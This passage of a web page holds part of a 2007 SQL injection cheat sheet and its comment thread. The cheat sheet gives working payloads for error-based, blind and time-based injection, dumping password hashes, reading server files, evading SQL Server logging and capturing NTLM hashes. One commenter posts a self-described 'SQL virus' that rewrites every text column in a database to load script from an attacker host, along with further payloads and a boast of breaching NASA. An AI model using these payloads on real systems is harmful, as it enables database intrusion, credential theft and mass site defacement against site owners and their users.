+<p><code><span id="gr">';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</span></code></p>
+
+<p><strong>Detailed Article : </strong><span id="gr"><a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></span> 
+
+  <br /></p>
+
+<h2>Blind SQL Injections </h2>
+
+<h3>About Blind SQL Injections </h3>
+
+<p class="idea">In a quite good production application generally <strong>you can not see error responses on the page</strong>, so you can not extract data through Union attacks or error based attacks. You have to do use Blind SQL Injections attacks to extract data. There are two kind of Blind Sql Injections. </p>
+
+<p class="idea"><strong>Normal Blind</strong>, You can not see a response in the page but you can still determine result of a query from response or HTTP status code 
+
+  <br /><strong>Totally Blind</strong>, You can not see any difference in the output in any kind. This can be an injection a logging function or similar. Not so common though. </p>
+
+<p class="idea">In normal blinds you can use <strong>if statements</strong> or abuse <strong>WHERE query in injection</strong> (<em>generally easier</em>), in totally blinds you need to use some waiting functions and analyze response times. For this you can use <strong>WAIT FOR DELAY '0:0:10' </strong>in SQL Server, BENCHMARK() in MySQL, <strong>pg_sleep(10) </strong>in PostgreSQL, and some PL/SQL tricks in ORACLE.</p>
+
+<h4><a id="BSQLAttackSamples" name="BSQLAttackSamples"></a>Real and a bit Complex Blind SQL Injection Attack Sample</h4>
+
+<p class="idea">This output taken from a real private Blind SQL Injection tool while exploiting SQL Server back ended application and enumerating table names. This requests done for first char of the first table name. SQL queries a bit more complex then requirement because of automation reasons. In we are trying to determine an ascii value of a char via binary search algorithm. </p>
+
+<p class="idea"><em><strong>TRUE</strong> and <strong>FALSE</strong> flags mark queries returned true or false. </em></p>
+
+<p><code><strong>TRUE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 
+
+    <br />
+
+    <br /><strong>FALSE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 
+
+    <br />
+
+    <br /><strong>TRUE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<103-- 
+
+    <br />
+
+    <br /><strong>FALSE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 
+
+    <br />
+
+    <br /><strong>TRUE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<89-- 
+
+    <br />
+
+    <br /><strong>FALSE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 
+
+    <br />
+
+    <br /><strong>TRUE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<83-- 
+
+    <br />
+
+    <br /><strong>FALSE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 
+
+    <br />
+
+    <br /><strong>FALSE</strong> : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)<80-- </code></p>
+
+<p class="idea">Since both of the <strong>last 2 queries failed </strong>we clearly know table name's first char's <strong>ascii value is 80 which means first char is `P`</strong>. This is the way to exploit Blind SQL injections by binary search algorithm. Other well known way is reading data bit by bit. Both can be effective in different conditions. </p>
+
+<h3> </h3>
+
+<h3>Waiting For Blind SQL Injections</h3>
+
+<p>First of all use this if it's really blind, otherwise just use 1/0 style errors to identify difference. Second, be careful while using times more than 20-30 seconds. database API connection or script can be timeout.</p>
+
+<h4>WAIT FOR DELAY 'time' (S) </h4>
+
+<p>This is just like sleep, wait for spesified time. CPU safe way to make database wait. </p>
+
+<p><code>WAITFOR DELAY '0:0:10'--</code></p>
+
+<p>Also you can use fractions like this,</p>
+
+<p><code>WAITFOR DELAY '0:0:0.51'</code></p>
+
+<h4>Real World Samples </h4>
+
+<ul>
+  <li>Are we 'sa' ? 
+    <br /><code>if (select user) = 'sa' waitfor delay '0:0:10' </code></li>
+
+  <li>ProductID = <code>1;waitfor delay '0:0:10'--</code> </li>
+
+  <li>ProductID =<code>1);waitfor delay '0:0:10'--</code> </li>
+
+  <li>ProductID =<code>1';waitfor delay '0:0:10'--</code> </li>
+
+  <li>ProductID =<code>1');waitfor delay '0:0:10'--</code> </li>
+
+  <li>ProductID =<code>1));waitfor delay '0:0:10'--</code> </li>
+
+  <li>ProductID =<code>1'));waitfor delay '0:0:10'--</code> </li>
+</ul>
+
+<h4>BENCHMARK() (M)</h4>
+
+<p>Basically we are abusing this command to make MySQL wait a bit. Be careful you will consume web servers limit so fast!</p>
+
+<p><code>BENCHMARK(howmanytimes, do this)</code></p>
+
+<h4>Real World Samples </h4>
+
+<ul>
+  <li>Are we root ? woot! 
+    <br /><code>IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))</code> 
+
+    <br />
+
+    <br /></li>
+
+  <li>Check Table exist in MySQL 
+    <br /><code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code> 
+
+    <br /></li>
+</ul>
+
+<h4>pg_sleep(seconds) (P)</h4>
+
+<p class="idea">Sleep for supplied seconds. </p>
+
+<ul>
+  <li><code>SELECT pg_sleep(10); </code>
+
+    <br /><span class="idea">Sleep 10 seconds. </span></li>
+</ul>
+
+<h2>Covering Tracks</h2>
+
+<h4>SQL Server -sp_password log bypass (S) </h4>
+
+<p>SQL Server don't log queries which includes sp_password for security reasons(!). So if you add --sp_password to your queries it will not be in SQL Server logs (<em>of course still will be in web server logs</em>, <em>try to use POST if it's possible</em>) </p>
+
+<h2>Clear SQL Injection Tests</h2>
+
+<p>These tests are simply good for blind sql injection and silent attacks.</p>
+
+<ol type="1">
+  <li><code>product.asp?id=4 (SMO) </code>
+
+    <ol type="a">
+      <li><code>product.asp?id=5-1</code> </li>
+
+      <li><code>product.asp?id=4 OR 1=1 
+          <br />
+
+          <br /></code></li>
+    </ol>
+  </li>
+
+  <li><code>product.asp?name=Book</code> 
+
+    <ol type="a">
+      <li><code>product.asp?name=Bo’%2b’ok</code> </li>
+
+      <li><code>product.asp?name=Bo’ || ’ok (<em>OM</em>)</code> </li>
+
+      <li><code>product.asp?name=Book’ OR ‘x’=’x</code> </li>
+    </ol>
+  </li>
+</ol>
+
+<h2>Some Extra MySQL Notes </h2>
+
+<ul>
+  <li>Sub Queries are working only MySQL 4.1+ </li>
+
+  <li>Users 
+    <ul type="circle">
+      <li><code>SELECT User,Password FROM mysql.user;</code> </li>
+    </ul>
+  </li>
+
+  <li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code> </li>
+
+  <li><span class="hi"><code>SEL</code></span><code>ECT ... INTO DUMPFILE</code> 
+
+    <ul type="circle">
+      <li><code>Write quer</code><span class="hi"><code>y into a <strong>new file </strong>(<em>can not modify existing file</em>s)</code></span> </li>
+    </ul>
+  </li>
+
+  <li>UDF Function 
+    <ul type="circle">
+      <li><code>create function LockWorkStation returns integer soname 'user32';</code> </li>
+
+      <li><code>select LockWorkStation(); 
+          <br /></code></li>
+
+      <li><code>create function ExitProcess returns integer soname 'kernel32';</code> </li>
+
+      <li><code>select exitprocess();</code> </li>
+    </ul>
+  </li>
+
+  <li><code>SELECT USER();</code> </li>
+
+  <li><code>SELECT password,USER() FROM mysql.user;</code> </li>
+
+  <li>First byte of admin hash 
+    <ul type="circle">
+      <li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code> </li>
+    </ul>
+  </li>
+
+  <li>Read File 
+    <ul>
+      <li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code> </li>
+    </ul>
+  </li>
+
+  <li>MySQL Load Data inifile 
+    <br />
+
+    <ul>
+      <li><strong>By default it’s not avaliable !</strong> 
+
+        <ul>
+          <li><code>create table foo( line blob ); 
+              <br />load data infile 'c:/boot.ini' into table foo; 
+
+              <br />select * from foo;</code> </li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+
+  <li>More Timing in MySQL </li>
+
+  <li><code>select benchmark( 500000, sha1( 'test' ) );</code> </li>
+
+  <li><code>query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 </code></li>
+
+  <li><code>select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); 
+      <br /></code><strong>Enumeration data, Guessed Brute Force</strong> 
+
+    <ul>
+      <li><code>select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );</code> </li>
+    </ul>
+  </li>
+</ul>
+
+<h4>Potentially Useful MySQL Functions</a></h4>
+
+<ul>
+  <li><code>MD5()</code> 
+
+    <br /><span class="idea">MD5 Hashing </span>
+
+    <br /></li>
+
+  <li><code>SHA1()</code> 
+
+    <br /><span class="idea">SHA1 Hashing </span>
+
+    <br />
+
+    <br /></li>
+
+  <li><code>PASSWORD()</code> </li>
+
+  <li><code>ENCODE()</code> </li>
+
+  <li><code>COMPRESS()</code> 
+
+    <br /><span class="idea">Compress data, can be great in large binary reading in Blind SQL Injections.</span> 
+
+    <br /></li>
+
+  <li><code>ROW_COUNT()</code> </li>
+
+  <li><code>SCHEMA()</code> </li>
+
+  <li><code>VERSION()</code> 
+
+    <br /><span class="idea">Same as <code>@@version</code></span> </li>
+</ul>
+
+<h2>Second Order SQL Injections</h2>
+
+<p>Basically you put an SQL Injection to some place and expect it's unfiltered in another action. This is common hidden layer problem. </p>
+
+<p>Name : <code>' + (SELECT TOP 1 password FROM users ) + ' </code>
+
+  <br />Email :<code> <a href="mailto:xx@xx.com">xx@xx.com</a></code></p>
+
+<p>If application is using name field in an unsafe stored procedure or function, process etc. then it will insert first users password as your name etc.</p>
+
+<h3>Forcing SQL Server to get NTLM Hashes </h3>
+
+<p class="idea">This attack can help you to get SQL Server user's Windows password of target server, but possibly you inbound connection will be firewalled. Can be very useful internal penetration tests. We force SQL Server to connect our Windows UNC Share and capture data NTLM session with a tool like Cain & Abel.</p>
+
+<h4>Bulk insert from a UNC Share (S) 
+  <br /><code>bulk insert foo from '\\YOURIPADDRESS\C$\x.txt' </code></h4>
+
+<p class="idea">Check out Bulk Insert Reference to understand how can you use bulk insert. </p>
+
+<h2>References </h2>
+
+<p><em>Since these notes collected from several different sources within several years and personal experiences, may I missed some references. If you believe I missed yours or someone else then <a href="http://ferruh.mavituna.com/iletisim/">drop me an email</a> (ferruh-at-mavituna.com), I'll update it as soon as possible. </em></p>
+
+<ul>
+  <li><strong>Lots of Stuff</strong> 
+
+    <ul>
+      <li><a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em> </li>
+
+      <li><a href="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">More Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em> </li>
+
+      <li><a href="http://www.imperva.com/download.asp?id=4">Blindfolded SQL Injection</a>, <em>Ofer Maor – Amichai Shulman</em> </li>
+
+      <li><a href="http://www.ngssoftware.com/papers/HackproofingMySQL.pdf">Hackproofing MySQL</a>, <em>Chris Anley</em> </li>
+
+      <li><a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html">Database Hacker's Handbook</a>, <em>David Litchfield, Chris Anley, John Heasman, Bill Grindlay</em> </li>
+
+      <li><strong>Upstairs Team! </strong>
+
+        <br />
+
+        <br /></li>
+    </ul>
+  </li>
+
+  <li><strong>MSSQL </strong><strong>Related</strong> 
+
+    <ul>
+      <li>MSSQL Operators - <a href="http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx</a> </li>
+
+      <li>Transact-SQL Reference - <a href="http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx</a> </li>
+
+      <li>String Functions (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms181984.aspx">http://msdn2.microsoft.com/en-us/library/ms181984.aspx</a> </li>
+
+      <li>List of MSSQL Server Collation Names - <a href="http://msdn2.microsoft.com/en-us/library/ms180175.aspx">http://msdn2.microsoft.com/en-us/library/ms180175.aspx</a> </li>
+
+      <li>MSSQL Server 2005 Login Information and some other functions : <a href="http://www.notsosecure.com/">Sumit Siddharth</a> 
+
+        <br />
+
+        <br /></li>
+    </ul>
+  </li>
+
+  <li><strong>MySQL </strong><strong>Related</strong> 
+
+    <ul>
+      <li>Comments : <a href="http://dev.mysql.com/doc/">http://dev.mysql.com/doc/ </a></li>
+
+      <li>Control Flows - <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html">http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html</a> </li>
+
+      <li>MySQL Gotchas - <a href="http://sql-info.de/mysql/gotchas.html">http://sql-info.de/mysql/gotchas.htm</a> </li>
+
+      <li><a href="http://www.securiteam.com/securityreviews/5KP0N1PC1W.html">New SQL Injection Concept</a>, <em>Tonu Samuel</em> </li>
+    </ul>
+  </li>
+</ul>
+
+<h2>ChangeLog</h2>
+
+<ul>
+  <li>15/03/2007 - Public Release v1.0 </li>
+
+  <li>16/03/2007 - v1.1 
+    <ul>
+      <li>Links added for some paper and book references </li>
+
+      <li>Collation sample added </li>
+
+      <li>Some typos fixed </li>
+
+      <li>Styles and Formatting improved </li>
+
+      <li>New MySQL version and comment samples </li>
+
+      <li>PostgreSQL Added to Ascii and legends, pg_sleep() added blind section </li>
+
+      <li>Blind SQL Injection section and improvements, new samples </li>
+
+      <li>Reference paper added for MySQL comments </li>
+    </ul>
+  </li>
+
+  <li>21/03/2007 - v1.2 
+    <ul>
+      <li>BENCHMARK() sample changed to avoid people DoS their MySQL Servers </li>
+
+      <li>More Formatting and Typo </li>
+
+      <li>Descriptions for some MySQL Function </li>
+    </ul>
+  </li>
+
+  <li>30/03/2007 v1.3 
+    <ul>
+      <li>Niko pointed out PotsgreSQL and PHP supports stacked queries </li>
+
+      <li>Bypassing second MD5 check login screens description and attack added </li>
+
+      <li>Mark came with extracting NTLM session idea, added </li>
+
+      <li>Detailed Blind SQL Exploitation added </li>
+    </ul>
+  </li>
+
+  <li>13/04/2007 v1.4 - <em>Release</em> 
+
+    <ul>
+      <li>SQL Server 2005 enabling xp_cmdshell added (<em>trick learned from mark</em>) </li>
+
+      <li><a href="http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html">Japanese version of SQL Injection Cheat Sheet released</a> (<em>v1.1</em>) </li>
+    </ul>
+  </li>
+</ul>
+
+<h2>To Do / Contact / Help </h2>
+
+<p>I got lots of notes for ORACLE, PostgreSQL, DB2 and MS Access and some of undocumented tricks in here. They will be available soon I hope. If you want to help or send a new trick, not here thing just <a href="http://ferruh.mavituna.com/iletisim/">drop me an email</a> (<em>ferruh-at-mavituna.com</em>). </p></div>
+    
+
+     <div class="commentlinks">
+     
+        <a href="/sql-injection-cheatsheet-oku/#addcomment" class="jwritecomment" id="/sql-injection-cheatsheet-oku/">
+        <img src="/mg/icons/comment_add.png" width="16" height="16" alt="Yorum Ekle" class="abs" />
+            Yorumunu Ekle</a> -
+        
+        <a href="/sql-injection-cheatsheet-oku/print/">
+        <img src="/mg/icons/printer.png" width="16" height="16" alt="Yaz&#305;c&#305; Versiyonu" class="abs" />
+            Yaz&#305;c&#305; Versiyonu</a> -
+            
+        <a href="/sql-injection-cheatsheet-oku/rss/">
+        <img src="/mg/icons/commentrss.png" width="16" height="16" alt="Yorumlar i&#231;in RSS" class="abs" />
+            Yorumlar i&#231;in RSS</a>
+               
+        
+</div>
+
+    <div id="relatedarticles">
+        <h3>&#304;li&#351;kili olabilecek yaz&#305;lar</h3>
+        <ul><li><a href="/sql-injection-cheat-sheet-is-online-oku/">SQL Injection Cheat Sheet is Online &#33;</a></li>
+<li><a href="/sql-injection-cheatsheet-online-oku/">SQL Injection Cheat Sheet Online&#33;</a></li>
+<li><a href="/sql-injection-cheat-sheet-yenilendi-oku/">SQL Injection Cheat Sheet Yenilendi</a></li>
+</ul>
+</div>
+
+</div>
+
+<a id="comments"></a>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1301817992/" width="64" height="64" alt="" />
+    </div>
+    <h4>Ravendra Patel - <em>12 g&#252;n 3 saat 24 dakika &#246;nce</em></h4>
+    <p>           Thanks so much dear. I'll always looking your help...</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/1407825541/" width="64" height="64" alt="" />
+    </div>
+    <h4><a href="http&#58;&#47;&#47;hackingethics&#46;wordpress&#46;com" rel="nofollow">&#34;vinnu&#34;</a> - <em>15 g&#252;n 5 saat 9 dakika &#246;nce</em></h4>
+    <p>           This is my SQL virus module for Uday virus (SQL+XSS+AJAX):<br /><br />';while(1=1) BEGIN DECLARE @Ta varchar(255),@Co varchar(4000) DECLARE uday CURSOR FOR select x.name,y.column_name from sysobjects x,information_schema.columns y where x.name=y.table_name and x.type='U' and (y.data_type='varchar' or y.data_type='text') OPEN uday FETCH NEXT FROM uday INTO @Ta,@Co WHILE(@@FETCH_STATUS=0) BEGIN exec('update ['+@Ta+'] set ['+@Co+']=''&lt;H2&gt;Legion Of Xtremers&lt;/H2&gt;&lt;HR&gt;&lt;H1&gt;Owned by LOXians now...&quot;vinnu&quot;&lt;script src=&quot;http://attackerserver/malicious.js&quot;&gt;&lt;/script&gt;'' where '+@Co+' not like ''XXXX''')FETCH NEXT FROM uday INTO @Ta,@Co END CLOSE uday DEALLOCATE uday commit END--sp_password<br /><br /><br />It hunts for all varchar or TEXT type columns in all user defined tables and replaces the values with the malicious values.<br /><br />&quot;vinnu&quot;<br />Legion Of Xtremers (India)</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-955206086/" width="64" height="64" alt="" />
+    </div>
+    <h4><a href="http&#58;&#47;&#47;ferruh&#46;mavituna&#46;com" rel="nofollow">Tesekkur ederim</a> - <em>25 g&#252;n 4 saat 23 dakika &#246;nce</em></h4>
+    <p>           Really Great Job dude.<br />Keep up!<br />Respect<br /><br />Tesekkur ederim Abi<img src="/mg/smilies/smile.gif" width="21" height="22" alt=":)" /></p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/879388921/" width="64" height="64" alt="" />
+    </div>
+    <h4>Seagate - <em>04.03.2010</em></h4>
+    <p>           Vinnu where can I contact you for a job?</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1226150521/" width="64" height="64" alt="" />
+    </div>
+    <h4>vinnu - <em>16.02.2010</em></h4>
+    <p>           Jaijeya<br />Some tips about MS-Access (Jet database engine):<br /><br />You should not insert comment characters as Jet db engine doesn't recognise them so avoid them in injection.<br />Instead you should try to inject the SQL in such a way that it satisfies the whole query.<br />In most cases the injection can be done in where or order by clauses so for example:<br />if query is like: WHERE title LIKE '%&lt;injectionhere&gt;%'<br />Then do it like: WHERE title LIKE'%a' your SQL here WHERE name LIKE 'a%'<br />...Likewise.<br />To know rest of the query insert a single double quote &quot; after a single quote ', in most cases it will reveal the part of query right from injection point.<br /><br />It is possible to use other databases or files from query. This can also be helpful in enumerating the directory structure of the target server.<br />Also it is most probable that the server will be windows based if Jet db engine is there. In this case there exists a file called setuplog.txt which gets created right at the time of windows installation and it contains important information about server os and hardware, and it is compatible to be loaded in a query as a table:<br /><br />'+union+select+1,File,Message,Line,Time,6,Tag,8,9,10,11+from+[TEXT;DATABASE=c:%5Cwindows;HDR=YES;FMT=Delimited].[setuplog.txt]'<br /></p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/1843677050/" width="64" height="64" alt="" />
+    </div>
+    <h4><a href="http&#58;&#47;&#47;wiki&#46;eslimasec&#46;com" rel="nofollow">eslimasec</a> - <em>13.02.2010</em></h4>
+    <p>           Dear Ferruh,<br /><br />we developped a small tool to aid Webapptesting that includes many of your tricks, It can be find here<a href="http://wiki.eslimasec.com/esliwiki/ProjectsPost">http://wiki.eslimasec.com/esliwiki/ProjectsPost</a>.<br /><br />hope it is useful 4 u and ya readers.<br /><br />best regards</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1637195092/" width="64" height="64" alt="" />
+    </div>
+    <h4>vinnu - <em>12.02.2010</em></h4>
+    <p>           In case of Oracle database server, when union doesn't work, then we can retrieve the desired results randomly. It helped me a lot in Penetrating into NASA.<br />Following type of injection will be helpful in such cases:<br /><br />'or+1=utl_inaddr.get_host_address((SELECT+username+FROM+(SELECT+username+FROM+all_users+ORDER+BY+dbms_random.value)+WHERE+rownum=1))--</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1637195092/" width="64" height="64" alt="" />
+    </div>
+    <h4>vinnu - <em>12.02.2010</em></h4>
+    <p>           Also in case if u r just pairing single quotes, then u can easily ecape one of the single quote using a forward slash &quot;\&quot;.<br />This will again break the SQL query and will inject the parameter as a SQL query.</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/1101713098/" width="64" height="64" alt="" />
+    </div>
+    <h4>mr&#46;ots - <em>05.02.2010</em></h4>
+    <p>           waow.<br />this is not going to be a waste bookmark!<br />thanks<img src="/mg/smilies/smile.gif" width="21" height="22" alt=":)" /></p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1736017014/" width="64" height="64" alt="" />
+    </div>
+    <h4>AK213 - <em>03.02.2010</em></h4>
+    <p>           Goooood</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/225341048/" width="64" height="64" alt="" />
+    </div>
+    <h4>vinnu - <em>28.01.2010</em></h4>
+    <p>           @Brent Jenkins:<br />Well there is a case, when this check can be thwarted, check scenario:<br />There are atleast two input fields (mostly user/password) and the fields are bound to the maxlength, and the maxlength check is also implemented in server side script e.g. asp, php etc.<br />Noiw If u fill the first comming input with single quote ' (SQL meta) then, above script will try to pair up the single quotes.<br />Now if all the space is acquired by single quotes, then above listed script will try to pair up all the single quotes and this will obviously  increase the size of input variable. Then if, the variable input is tripped, then it may lead to an unpaired single quotation mark, this will pair up with the second condition's first single quote and will make second condition as a string and the second input becomes a part of SQL script and making SQL injection feasible.<br />LOX (Legion Of Xtremers)INDIA</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1524106412/" width="64" height="64" alt="" />
+    </div>
+    <h4>kai - <em>31.10.2009</em></h4>
+    <p>           this sql not working in .aspx login page. can anyone tell me sql injection to bypass .aspx login page.</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1506816942/" width="64" height="64" alt="" />
+    </div>
+    <h4>kristofdpx - <em>29.09.2009</em></h4>
+    <p>           Stacked queries didn't work with PHP-MYSQL. Tested on PHP 5.2.1 and Mysql 5.0</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/1673518080/" width="64" height="64" alt="" />
+    </div>
+    <h4>jambo - <em>27.07.2009</em></h4>
+    <p>           If this helps at all, follow this link to a page I posted with some programming help against those SQL Injection attacks!<br />Hey. Thanks for the tutorial. It is very complete.</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/656648260/" width="64" height="64" alt="" />
+    </div>
+    <h4>bugman - <em>02.07.2009</em></h4>
+    <p>           All the listed cases are true only for those lames who still use concatenation of user-driven datum to SQL code instead of parameters-binding mechanism</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-1022016500/" width="64" height="64" alt="" />
+    </div>
+    <h4>milon - <em>01.07.2009</em></h4>
+    <p>           hello<br />  any one can give me an example how to apply SQL injection in website  details.</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/1139031621/" width="64" height="64" alt="" />
+    </div>
+    <h4><a href="http&#58;&#47;&#47;wocares&#46;com" rel="nofollow">Kyo</a> - <em>26.03.2009</em></h4>
+    <p>           I've got a little tool for generating CHAR() and hex codes for SQL injections if magic quotes is enabled here:<br /><br />http://wocares.com/noquote.php<br /><br />just check SQL Injection</p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/787188187/" width="64" height="64" alt="" />
+    </div>
+    <h4><a href="http&#58;&#47;&#47;www&#46;k&#45;wi&#46;com" rel="nofollow">zniko07</a> - <em>05.03.2009</em></h4>
+    <p>           ' OR 1=1--<br />oh i tried to sql inject your comments but it didn't worked<img src="/mg/smilies/grin.gif" width="21" height="22" alt=":D" />! lol<br />i really liked your article!! it's great! thank you<br /><br /></p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/902991003/" width="64" height="64" alt="" />
+    </div>
+    <h4>dave roberts - <em>27.01.2009</em></h4>
+    <p>           Thanks so much for the document. Its simply awesome, i m successful<img src="/mg/smilies/wink.gif" width="21" height="22" alt=";)" /></p>
+</div>
+<div class="comment" >
+    <div class="commentd">
+        <img src="/avatar/-123711581/" width="64" height="64" alt="" />
+    </div>
+    <h4><a href="http&#58;&#47;&#47;www&#46;warezlol&#46;com&#47;" rel="nofollow">fLaSh</a> - <em>31.12.2008</em></h4>
+    <p>           I really liked the cheatsheet. nice work!<br /><br />Author of MySQLi Dumper</p>
+</div>
+
+<div style="text-align:center;"><span class="pagingnormal"><strong>1</strong> - <a href="/sql-injection-cheatsheet-oku/page/2/#comments">2</a> - <a href="/sql-injection-cheatsheet-oku/page/3/#comments">3</a> - <a href="/sql-injection-cheatsheet-oku/page/4/#comments">4</a> - 
+<a href="/sql-injection-cheatsheet-oku/page/2/#comments">&#304;leri &#187;</a>  - 
+<a href="/sql-injection-cheatsheet-oku/page/4/#comments">&#187;&#187;</a></span></div>
+<div id="commentarticlewrite"><script src="/js/editor/jquery.markitup.pack.js" type="text/javascript"></script>
+<script src="/js/editor/sets/default/set.js" type="text/javascript"></script>
+
+<h1 id="addcomment">Yorum Yaz&#305;n</h1>
+<blockquote><br />T&#252;m yorumlar onaydan ge&#231;mektedir, bu i&#351;lem en uzun 30 dk. s&#252;recektir. E-mail adresleri yeni yorumlar&#305; bildirme harici hi&#231; bir ba&#351;ka ama&#231;la kullan&#305;lmamaktad&#305;r ve sitede g&#246;z&#252;kmemektedir. </blockquote>
+<form action="/ajax/comments/save/default.aspx?redirect=true" class="commentform" id="addcommentform-sql-injection-cheatsheet" method="post" >
+<div style="width:100%">
+	    <label for="sender" class="required">&#304;sim / Nick :</label> 
+	    <input id="sender" name="sender" value="" tabindex="1" /><br />
+	    
+	    <label for="email" accesskey="e">Email :</label>
+	    <input type="text" id="email" name="email" tabindex="2" title="email" value="" />
+	    <input id="newcomments" name="newcomments" type="checkbox"  style="width:auto;display:none" value="1"  /> <!-- Yeni yorumlardan haberdar et --><br />
+	    	    
+	    <label for="website">Web Sitesi :</label> 
+	    <input id="website" name="website" value="" tabindex="3" /><br />    	    
+		    
+		<textarea id="comment" name="comment" tabindex="4" rows="10" cols="10"></textarea>
+   	    <input type="hidden" value="sql-injection-cheatsheet" name="article" />
+        
+   	    <div>
+   	    <img style="border:1px solid #999;float:right;margin-right:100px" src="/captcha/?908385" width="150" height="50" alt="Captcha Kodu"  class="captcha" />  
+   	    <label style="width:200px;margin-top:15px" for="captcha">Sa&#287;daki Resimdeki Numaralar :</label> <input id="captcha" name="captcha"  maxlength="6" tabindex="5" style="margin-top:15px;width:80px"/> </div>
+   	    
+   	    <p style="clear:both"><input type="submit" value="Yorumu Ekle" class="but" tabindex="6" /></p>	
+</div>
+</form>
+
+<script type="text/javascript">
+    $("textarea").markItUp(mySettings);
+    if(self.SendingForm)
